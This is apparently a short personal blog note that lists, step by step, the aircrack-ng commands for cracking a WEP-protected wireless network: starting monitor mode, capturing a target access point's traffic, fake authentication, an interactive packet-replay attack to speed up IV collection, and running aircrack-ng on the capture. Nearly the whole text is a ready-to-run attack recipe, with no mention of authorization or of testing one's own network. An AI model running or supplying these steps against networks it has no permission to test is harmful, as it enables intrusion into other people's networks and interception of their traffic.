Speaking of [wireless](|filename|2010_11_ubuntu-1010-fixed-channel-mon0-1.md)...The following is just a quick note-to-self, because I always forget the exact commands and end up crawling around the [Aircrack wiki](http://www.aircrack-ng.org/doku.php) for a bit. I though I'd posted this before, but I can't seem to find it.  
### TTY1      sudo airmon-ng start eth1      # Assume monitor started on mon0...        sudo airodump-ng mon0      # Scout interesting APs        sudo airodump-ng --channel X --bssid XX:XX:XX:XX:XX:XX -w output mon0      # Make sure to replace "X". This terminal is now dumping data### TTY2      sudo aireplay-ng -1 0 -a XX:XX:XX:XX:XX:XX mon0      # ... Association successful :-)  Now start the attack. I like opening a new terminal for this.  Don't bother with the ARP request replay attack. The best method to use is the `-p 0841` one, especially when using a crappy wifi chip like me (3945ABG). Last time I checked, the advanced attack methods (KoreK chopchop, fragmentation, caffe-latte and Hirte) didn't work.### TTY3     sudo aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b XX:XX:XX:XX:XX:XX mon0      # Wait until a packet is captured. It's best to use a small one (Size: 68).          # Reinject and the data-counter in TTY1 (airodump) should go up.### TTY4          sudo aircrack-ng -b XX:XX:XX:XX:XX:XX output*.cap      ### TTY5 (optional)    sudo aircrack-ng -K -b XX:XX:XX:XX:XX:XX output*.cap
